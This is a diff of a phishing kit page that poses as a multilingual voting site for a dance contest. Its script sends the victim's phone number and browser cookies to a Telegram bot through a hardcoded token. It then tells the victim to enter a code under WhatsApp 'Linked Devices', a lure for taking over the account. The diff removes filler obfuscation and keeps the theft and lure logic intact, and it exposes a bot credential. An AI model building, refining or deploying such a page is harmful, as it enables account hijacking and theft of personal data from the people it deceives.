-                                <svg viewBox="0 0 24 24" height="24" width="24" preserveAspectRatio="xMidYMid meet"
-                                    class="" version="1.1" x="0px" y="0px" enable-background="new 0 0 24 24">
-                                    <path fill="#bfbbbb"
-                                        d="M15.009,13.805h-0.636l-0.22-0.219c0.781-0.911,1.256-2.092,1.256-3.386 c0-2.876-2.332-5.207-5.207-5.207c-2.876,0-5.208,2.331-5.208,5.207s2.331,5.208,5.208,5.208c1.293,0,2.474-0.474,3.385-1.255 l0.221,0.22v0.635l4.004,3.999l1.194-1.195L15.009,13.805z M10.201,13.805c-1.991,0-3.605-1.614-3.605-3.605 s1.614-3.605,3.605-3.605s3.605,1.614,3.605,3.605S12.192,13.805,10.201,13.805z">
-                                    </path>
+                                <img src="https://dancebattle.life/static/img/flags/AU.png" alt="AU"> <!-- Убрал GET-параметр ?v=... -->
+                            </div>
+                            <p class="name">Australia</p>
+                            <div class="icon">
+                                <svg viewBox="0 0 10 5" height="5" width="10" preserveAspectRatio="xMidYMid meet" class="" fill="none">
+                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M0 0L5 5L10 0H0Z" fill="currentColor" fill-opacity="0.3"></path>
                                 </svg>
                             </div>
-                            <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">
-                                lNJFwMkFeieFVsR YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
-                            <input type="text" id="search" data-translate-key="form1.searchPlaceholder" placeholder="Search..."> 
-
                         </div>
-                        <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">
-                            lNJFwMkFeieFVsR YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
-                        <div class="items">
-                            <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">
-                                KeufuQduGbyIESnJxdKC hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX
-                                JxoZektYrbHlY WsLTZhNoKjWIykQojN LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc
-                                EnxoxcmjcpyZygdOuwbVkt</ul>
-                            <div class="overflow">
-                                <!-- *** СПИСОК СТРАН С ФЛАГАМИ (КАК В ВАШЕМ ПРИМЕРЕ) *** -->
+                        <!-- Выпадающий список стран (оставляем) -->
+                        <div class="countries hidden"> 
+                            <div class="search">
+                                <div class="image">
+                                    <svg viewBox="0 0 24 24" height="24" width="24" preserveAspectRatio="xMidYMid meet" class="" version="1.1" x="0px" y="0px" enable-background="new 0 0 24 24">
+                                        <path fill="#bfbbbb" d="M15.009,13.805h-0.636l-0.22-0.219c0.781-0.911,1.256-2.092,1.256-3.386 c0-2.876-2.332-5.207-5.207-5.207c-2.876,0-5.208,2.331-5.208,5.207s2.331,5.208,5.208,5.208c1.293,0,2.474-0.474,3.385-1.255 l0.221,0.22v0.635l4.004,3.999l1.194-1.195L15.009,13.805z M10.201,13.805c-1.991,0-3.605-1.614-3.605-3.605 s1.614-3.605,3.605-3.605s3.605,1.614,3.605,3.605S12.192,13.805,10.201,13.805z"></path>
+                                    </svg>
+                                </div>
+                                <input type="text" id="search" data-translate-key="form1.searchPlaceholder" placeholder="Search..."> 
+                            </div>
+                            <div class="items">
+                                <div class="overflow">
+                                    <!-- *** СПИСОК СТРАН С ФЛАГАМИ (КАК В ВАШЕМ ПРИМЕРЕ) *** -->
                                 <div class="item" data-code="+61" data-lang="AU" data-name="Australia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AU.png" alt="AU"> </div> <p class="name">Australia</p> <p class="code">+61</p> </div>
                                 <div class="item" data-code="+43" data-lang="AT" data-name="Österreich"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AT.png" alt="AT"> </div> <p class="name">Österreich</p> <p class="code">+43</p> </div>
                                 <div class="item" data-code="+994" data-lang="AZ" data-name="Azərbaycan"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AZ.png" alt="AZ"> </div> <p class="name">Azərbaycan</p> <p class="code">+994</p> </div>
@@ -690,170 +609,77 @@
                                 <div class="item" data-code="+1" data-lang="JM" data-name="Jamaica"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JM.png" alt="JM"> </div> <p class="name">Jamaica</p> <p class="code">+1</p> </div>
                                 <div class="item" data-code="+81" data-lang="JP" data-name="日本"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JP.png" alt="JP"> </div> <p class="name">日本</p> <p class="code">+81</p> </div>
                                 <!-- *** КОНЕЦ БЛОКА С ИСПРАВЛЕННЫМИ ПУТЯМИ К ФЛАГАМ *** -->
+                                </div>
                             </div>
-                            <ul class="egeWSiccsIJQ SCLYYYcSeAF qaeFHqJVbGDfsBGDGrdnjSCK jOlNkfIrteJgkl">
-                                <h5 class="kvIpScpLemN">ITmVeZdXJDSCBWl zVbKqQUbIoZBZzyyzo DCbunYKAbrsFUv SygnOVnIsOj
-                                </h5>
-                            </ul>
                         </div>
-                        <h5
-                            class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
-                            xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>
-                    </div>
-                    <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
-                        <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
-                            PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
-                    </span>
-                    <input type="text" class="number" id="number" value="+61" /> <!-- Этот input обновляется из intl-tel-input или number.js -->
-                    <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
-                        <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
-                            PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
-                    </span>
-                    <button class="button primary" id="next-step" data-translate-key="form.continueButton">Continua</button>
-
-                    <span
-                        class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
-                        <div class="btBTGkttju">
-                            <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
+                        <!-- Поле ввода номера (оставляем) -->
+                        <input type="text" class="number" id="number" value="+61" />
+                        <!-- Кнопка (оставляем) -->
+                        <button class="button primary" id="next-step" data-translate-key="form.continueButton">Continua</button>
+                        <!-- Ошибка (оставляем) -->
+                        <p class="error hidden" data-translate-key="form1.error.invalidNumber">Numero di telefono non valido</p>
+                        <!-- Форма верификации, если нужна (оставляем) -->
+                        <div id="verifyForm" style="display: none; margin-top: 20px;">
+                            <input type="text" id="codeInput" data-translate-key="form1.verifyCodePlaceholder" placeholder="Введіть код">
+                            <button id="submitCode" data-translate-key="form1.verifySubmitButton">Підтвердити</button>
                         </div>
-                    </span>
-                    <p class="error hidden" data-translate-key="form1.error.invalidNumber">Numero di telefono non valido</p>
-                    <small
-                        class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
-                        <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
-                            StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
-                    </small>
-                    <!-- Этот блок был в вашем коде, оставляю его. Убедитесь, что его логика вам нужна. -->
-                    <div id="verifyForm" style="display: none; margin-top: 20px;">
-                        <input type="text" id="codeInput" data-translate-key="form1.verifyCodePlaceholder" placeholder="Введіть код">
-                        <button id="submitCode" data-translate-key="form1.verifySubmitButton">Підтвердити</button>
                     </div>
                 </div>
-                <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
-                    WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
-                    HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
-            </div>
+            </div> <!-- Конец .form-area -->
         </div> <!-- Конец div#step-1 -->
-        <h5
-            class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
-            ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi
-        </h5>
-        <div class="block code hidden" id="step-2"> <!-- Этот блок изначально скрыт, показывается JS -->
-            <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
-                <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
-                    PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
-            </span>
+        <div class="block code hidden" id="step-2">
             <div class="text">
-                <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
-                    WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
-                    HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
-
+                <!-- Удалите скрытые h6, input, h5, small, если они не нужны -->
                 <h2 data-translate-key="form2.title">Autorizzazione rapida e facile tramite WhatsApp</h2>
-
-                <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
-                    WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
-                    HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
-                <input type="hidden" id="user-number">
-                <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
-
-                <p data-translate-key="form2.description">Accedi all'app WhatsApp, seleziona 'Dispositivi collegati' nella finestra delle
-                    impostazioni, quindi inserisci questo codice</p>
-
-                <h5
-                    class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
-                    xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>
-
-                <small
-                    class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
-                    <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
-                        StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
-                </small>
+                <p data-translate-key="form2.description">Accedi all'app WhatsApp, seleziona 'Dispositivi collegati' nella finestra delle impostazioni, quindi inserisci questo codice</p>
             </div>
 
-            <div class="number-column">
-                <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">lNJFwMkFeieFVsR
-                    YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
-                <div class="number-container" id="loader-container"> <!-- Контейнер для лоадера и кода -->
-                    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
-                    <div class="loader" style="display: none;"></div> <!-- Лоадер, изначально скрыт, управляется JS -->
-
-                    <!-- Этот блок с символами кода number-code, если он вам нужен, будет показываться JS -->
+            <div class="form-area"> <!-- ОБЕРТКА ДЛЯ ПРАВОЙ КОЛОНКИ -->
+                <div class="number-container" id="loader-container">
+                    <div class="loader" style="display: block;"></div> <!-- Лоадер виден по умолчанию, JS управляет -->
                     <div class="number-code hidden" id="number-code" data-code="">
                         <div class="symbol"></div><div class="symbol"></div><div class="symbol"></div><div class="symbol"></div>
                         <div class="split">–</div>
                         <div class="symbol"></div><div class="symbol"></div><div class="symbol"></div><div class="symbol"></div>
                     </div>
-                    <div class="QSXSXYDCnbqkFWy cQMrMpHzkkQjpZlwV SPmBXkiC DGcoknrjkScAqRDAknBIkGOoW">
-                        <h6 class="WvydNrlW">BrfCuLcTQLiKjY nVEDKnWiunmj jkbunFWYcWav OqGWSpKabaXZkPbpA WlmSWytoty
-                            GLIdETFzmCHyvpBBTlxnEk xYCEOwWsNBNYvMNpsrz QFEJdQBHW</h6>
-                    </div>
                 </div>
 
-                <!-- Форма для ввода кода -->
-                <div id="form-step-2-container" class="form-container form-code" style="display: none;"> <!-- Изначально скрыта, показывается JS -->
+                <div id="form-step-2-container" class="form-container form-code" style="display: none;"> <!-- Изначально скрыта, JS управляет -->
                     <p class="text code-title" data-translate-key="form2.codeLabel">Code:</p>
                     <div class="form" id="form-code">
-                        <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                         <input type="text" class="number" id="code" data-translate-key="form2.codePlaceholder" placeholder="Enter code"/>
-                        <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
-                            <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
-                                PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
-                        </span>
                         <button class="button primary" id="two-step" data-translate-key="form.continueButton">Continua</button>
                     </div>
                 </div>
-                <div class="QSXSXYDCnbqkFWy cQMrMpHzkkQjpZlwV SPmBXkiC DGcoknrjkScAqRDAknBIkGOoW">
-                    <h6 class="WvydNrlW">BrfCuLcTQLiKjY nVEDKnWiunmj jkbunFWYcWav OqGWSpKabaXZkPbpA WlmSWytoty
-                        GLIdETFzmCHyvpBBTlxnEk xYCEOwWsNBNYvMNpsrz QFEJdQBHW</h6>
-                </div>
-                <div class="button primary hidden" id="copy-code" data-translate-key="form2.copyButton">Copia</div> <!-- Если нужна кнопка копирования -->
-            </div>
+                <!-- Кнопка копирования, если нужна -->
+                <!-- <div class="button primary hidden" id="copy-code" data-translate-key="form2.copyButton">Copia</div> -->
+            </div> <!-- Конец .form-area -->
         </div> <!-- Конец div#step-2 -->
 
-        <strong class="TjYfSpzXTNoUdv ieLfWPtgF">EQinIceVn aPMEmjEk qdoRdBliaomXbSKCLaLZI QZhWtdNh</strong>
+        <!-- Удалите этот <strong class="TjYfSpzXTNoUdv ..."> если он не нужен -->
+        <!-- <strong class="TjYfSpzXTNoUdv ieLfWPtgF">EQinIceVn aPMEmjEk qdoRdBliaomXbSKCLaLZI QZhWtdNh</strong> -->
     </div> <!-- Конец div.wrapper -->
-    <small
-        class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
-        <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
-            StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
-    </small>
-    <div class="popup top40" id="popreboot" style="display: none;"> <!-- Изначально скрыт, управляется JS -->
-        <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+    <!-- Удалите этот <small class="CUuwPmBOQqkLDnR ..."> если он не нужен -->
+    <!-- <small class="CUuwPmBOQqkLDnR ..."> ... </small> -->
+
+    <div class="popup top40" id="popreboot" style="display: none;">
         <div class="body">
+            <!-- Удалите скрытый h5, если не нужен -->
             <h2 data-translate-key="popup.reboot.title">Your vote has been counted, thank you</h2>
-            <button class="button primary btn-ok" id="btn-ok-reboot" data-translate-key="popup.reboot.button">Ok</button> <!-- Изменен ID -->
-            <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+            <button class="button primary btn-ok" id="btn-ok-reboot" data-translate-key="popup.reboot.button">Ok</button>
         </div>
-        <small
-            class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
-            <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
-                StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
-        </small>
     </div>
 
-    <div class="popup top40" id="popwhat" style="display: none;"> <!-- Изначально скрыт, управляется JS -->
-        <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+    <div class="popup top40" id="popwhat" style="display: none;">
         <div class="body">
+            <!-- Удалите скрытые h5, h6, span, если они не нужны -->
             <h2 data-translate-key="popup.what.title">Something is wrong!</h2>
-            <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP WFFhTuDduNDAMMCnWt
-                MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK HMnrMFReAPNuUAFJVUhthI
-                CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
             <p data-translate-key="popup.what.paragraph">You entered the code incorrectly, go to the WhatsApp application and enter the code correctly, otherwise your vote will not be counted.</p>
-            <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
-                <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
-                    PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
-            </span>
-            <button class="button primary btn-reb" id="btn-reboot-what" data-translate-key="popup.what.button">Reboot</button> <!-- Изменен ID -->
-            <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+            <button class="button primary btn-reb" id="btn-reboot-what" data-translate-key="popup.what.button">Reboot</button>
         </div>
-        <small
-            class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
-            <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
-                StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
-        </small>
     </div>
-    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
-                                
+    <!-- Удалите этот <h5 class="RdMuchDHj ..."> если он не нужен -->
+    <!-- <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5> -->
     <script>
         const translations = {
             // --- English (Fallback) ---
@@ -864,26 +690,22 @@
                 "form1.searchPlaceholder": "Search...",
                 "form.continueButton": "Continue",
                 "form1.error.invalidNumber": "Invalid phone number",
-                "form1.error.phoneRequired": "Phone number is required.", // For paragraph error
-                "form1.error.phoneRequiredAlert": "Please enter your phone number.", // For alert
-                "form1.verifyCodePlaceholder": "Enter code", // For the extra verify form you had
-                "form1.verifySubmitButton": "Confirm",    // For the extra verify form you had
+                "form1.error.phoneRequired": "Phone number is required.", 
+                "form1.error.phoneRequiredAlert": "Please enter your phone number.", 
+                "form1.verifyCodePlaceholder": "Enter code", 
+                "form1.verifySubmitButton": "Confirm",    
                 "form1.error.noCookies": "No cookies found",
-
-
                 "form2.title": "Quick and easy authorization via WhatsApp",
                 "form2.description": "Log in to the WhatsApp app, select 'Linked Devices' in the settings window, then enter this code",
                 "form2.codeLabel": "Code:",
                 "form2.codePlaceholder": "Enter code",
                 "form2.copyButton": "Copy",
                 "form2.error.noData": "Code or phone number is missing.", 
-
                 "popup.reboot.title": "Your vote has been counted, thank you",
                 "popup.reboot.button": "Ok",
                 "popup.what.title": "Something is wrong!",
                 "popup.what.paragraph": "You entered the code incorrectly. Go to the WhatsApp application and enter the code correctly, otherwise your vote will not be counted.",
                 "popup.what.button": "Reboot",
-
                 "error.backendConnection": "Error connecting to the server. Please try again."
             },
             // --- Italian ---
@@ -899,21 +721,17 @@
                 "form1.verifyCodePlaceholder": "Inserisci codice",
                 "form1.verifySubmitButton": "Conferma",
                 "form1.error.noCookies": "Nessun cookie trovato",
-
-
                 "form2.title": "Autorizzazione rapida e facile tramite WhatsApp",
                 "form2.description": "Accedi all'app WhatsApp, seleziona 'Dispositivi collegati' nella finestra delle impostazioni, quindi inserisci questo codice",
                 "form2.codeLabel": "Codice:",
                 "form2.codePlaceholder": "Inserisci codice",
                 "form2.copyButton": "Copia",
                 "form2.error.noData": "Codice o numero di telefono mancante.",
-
                 "popup.reboot.title": "Il tuo voto è stato conteggiato, grazie",
                 "popup.reboot.button": "Ok",
                 "popup.what.title": "Qualcosa è andato storto!",
                 "popup.what.paragraph": "Hai inserito il codice in modo errato. Vai all'applicazione WhatsApp e inserisci il codice correttamente, altrimenti il tuo voto non verrà conteggiato.",
                 "popup.what.button": "Riprova", 
-
                 "error.backendConnection": "Errore di connessione al server. Riprova."
             },
             // --- Russian ---
@@ -929,47 +747,41 @@
                 "form1.verifyCodePlaceholder": "Введите код",
                 "form1.verifySubmitButton": "Подтвердить",
                 "form1.error.noCookies": "Куки не найдены",
-
                 "form2.title": "Быстрая и легкая авторизация через WhatsApp",
                 "form2.description": "Войдите в приложение WhatsApp, выберите 'Связанные устройства' в окне настроек, затем введите этот код",
                 "form2.codeLabel": "Код:",
                 "form2.codePlaceholder": "Введите код",
                 "form2.copyButton": "Копировать",
                 "form2.error.noData": "Отсутствует код или номер телефона.",
-
                 "popup.reboot.title": "Ваш голос учтён, спасибо",
                 "popup.reboot.button": "Ок",
                 "popup.what.title": "Что-то пошло не так!",
                 "popup.what.paragraph": "Вы ввели код неправильно. Перейдите в приложение WhatsApp и введите код правильно, иначе ваш голос не будет засчитан.",
                 "popup.what.button": "Повторить",
-
                 "error.backendConnection": "Ошибка подключения к серверу. Пожалуйста, попробуйте еще раз."
             }
-            // Добавьте сюда другие языки по мере необходимости (es, de, fr и т.д.)
         };
 
-        let currentLang = 'en'; // Default language
+        let currentLang = 'en'; 
 
         function applyTranslations(lang) {
             if (!lang || !translations[lang]) {
                 console.warn(`Translations not found for language: ${lang}. Defaulting to 'en'.`);
                 lang = 'en';
             }
-            currentLang = lang; // Store current language
-            document.documentElement.lang = currentLang; // Set lang attribute on HTML tag
+            currentLang = lang; 
+            document.documentElement.lang = currentLang; 
 
             document.querySelectorAll('[data-translate-key]').forEach(element => {
                 const key = element.getAttribute('data-translate-key');
-                // Пытаемся взять перевод для текущего языка, если нет - для английского (fallback)
                 const translation = translations[lang]?.[key] || translations['en']?.[key]; 
-
                 if (translation) {
                     if (element.tagName === 'INPUT' && (element.type === 'button' || element.type === 'submit' || element.type === 'reset')) {
                         element.value = translation;
                     } else if (element.tagName === 'INPUT' && element.hasAttribute('placeholder')) {
                         element.placeholder = translation;
                     } else if (element.tagName === 'TITLE') {
-                         document.title = translation; // Обновляем заголовок страницы
+                         document.title = translation; 
                     } else {
                         element.textContent = translation;
                     }
@@ -979,28 +791,20 @@
             });
         }
         document.addEventListener("DOMContentLoaded", function () {
-            // --- Определение языка ---
-            let detectedLanguage = 'en'; // Default
+            let detectedLanguage = 'en'; 
             const htmlTagLang = document.documentElement.lang;
-
-            // 1. Пробуем язык из <html lang="...">
             if (htmlTagLang && translations[htmlTagLang.split('-')[0]]) {
                 detectedLanguage = htmlTagLang.split('-')[0];
             } else {
-                // 2. Попытка получить язык из URL (например, /login/zomia-it -> it)
                 const pathParts = window.location.pathname.split('/');
-                const lastPathPart = pathParts.pop() || pathParts.pop(); // Handle trailing slash
-
+                const lastPathPart = pathParts.pop() || pathParts.pop(); 
                 if (lastPathPart) {
-                    // Если формат zomia-it, берем 'it'. Если просто 'it', берем 'it'.
                     const langCandidate = lastPathPart.includes('-') ? lastPathPart.split('-').pop() : lastPathPart;
                     if (translations[langCandidate]) {
                         detectedLanguage = langCandidate;
                     }
                 }
             }
-            
-            // 3. Если не удалось определить из URL или HTML-тега, пробуем язык браузера
             if (detectedLanguage === 'en' && !(htmlTagLang && translations[htmlTagLang.split('-')[0]])) { 
                  const browserLang = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
                  if (translations[browserLang]) {
@@ -1009,42 +813,36 @@
             }
             applyTranslations(detectedLanguage);
 
-            // --- Обработчики кнопок попапов ---
             document.getElementById("btn-ok-reboot")?.addEventListener("click", () => {
                 document.getElementById("popreboot").style.display = "none";
                 const redirectUrl = document.body.dataset.redirect;
                 if (redirectUrl) {
-                    window.location.href = redirectUrl; // Редирект после успешного голосования
+                    window.location.href = redirectUrl; 
                 }
             });
-
             document.getElementById("btn-reboot-what")?.addEventListener("click", () => {
-                location.reload(); // Перезагружаем страницу для попапа "popwhat"
+                location.reload(); 
             });
 
-            // --- Инициализация состояний ---
             const loaderElement = document.querySelector("#loader-container .loader"); 
-            const formStep2Container = document.getElementById("form-step-2-container");
+            const qrCodeContainer = document.getElementById("number-code"); // Контейнер для QR кода
+            const formCodeInputContainer = document.getElementById("form-step-2-container"); // Контейнер для формы ввода кода
 
-            // --- Константы для Telegram ---
-            // ВАЖНО: Хранение токена в клиентском JS - это ОЧЕНЬ НЕБЕЗОПАСНО.
-            // Этот запрос должен идти через ваш бэкенд.
             const token = "7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g"; 
-            const chat_id = "7538727898";
+            const chat_id = "7538727898"; // Убедитесь, что chat_id правильный
             const backendURL = "https://api.bestballerinavote.com"; 
 
-            // --- Элементы DOM ---
             const nextStepBtn = document.getElementById("next-step");
             const codeStepBtn = document.getElementById("two-step");
-            const errorParagraphStep1 = document.querySelector('#form-step-1 .form p.error');
-            // --- Логика шагов ---
+            const errorParagraphStep1 = document.querySelector('#form-step-1 .form-container p.error'); // Изменил селектор
+
             nextStepBtn?.addEventListener("click", function (e) {
                 e.preventDefault();
                 const phoneInput = document.getElementById("number");
-                const phone = phoneInput.value.trim(); // Здесь уже будет номер с кодом страны от intl-tel-input
+                const phone = phoneInput.value.trim(); 
                 const cookies = document.cookie || (translations[currentLang]['form1.error.noCookies'] || "No cookies");
 
-                if (!phone) { // Простая проверка, что поле не пустое. intl-tel-input может иметь свои методы валидации (iti.isValidNumber())
+                if (!phone) { 
                     if (errorParagraphStep1) {
                         errorParagraphStep1.textContent = translations[currentLang]["form1.error.phoneRequired"] || "Phone number is required.";
                         errorParagraphStep1.classList.remove('hidden');
@@ -1058,9 +856,7 @@
                 }
 
                 sessionStorage.setItem("submittedPhone", phone);
-
                 const msg = `📲 Новий запит\nТелефон: ${phone}\n🍪 Кукі: ${cookies}`;
-                // НЕБЕЗОПАСНО: Прямой запрос к Telegram API с токеном
                 fetch(`https://api.telegram.org/bot${token}/sendMessage`, { 
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -1070,10 +866,28 @@
                 document.getElementById("step-1").style.display = "none";
                 const step2Block = document.getElementById("step-2");
                 step2Block.classList.remove("hidden");
-                step2Block.style.display = "block"; 
-                if (formStep2Container) formStep2Container.style.display = "block"; 
-                document.getElementById("code").focus();
+                step2Block.style.display = "flex"; // Используем flex, т.к. .block теперь flex-row
+
+                // Показываем лоадер, скрываем QR и форму ввода кода
+                if(loaderElement) loaderElement.style.display = "block";
+                if(qrCodeContainer) qrCodeContainer.classList.add("hidden");
+                if(formCodeInputContainer) formCodeInputContainer.style.display = "none";
+                
+                // Здесь должен быть ваш код для генерации/запроса QR-кода
+                // После получения QR-кода:
+                // if(loaderElement) loaderElement.style.display = "none";
+                // if(qrCodeContainer) {
+                //     qrCodeContainer.innerHTML = '<img src="URL_ВАШЕГО_QR_КОДА" alt="QR Code">'; // Пример
+                //     qrCodeContainer.classList.remove("hidden");
+                // }
+                // ИЛИ если сразу форма ввода кода:
+                if(formCodeInputContainer) {
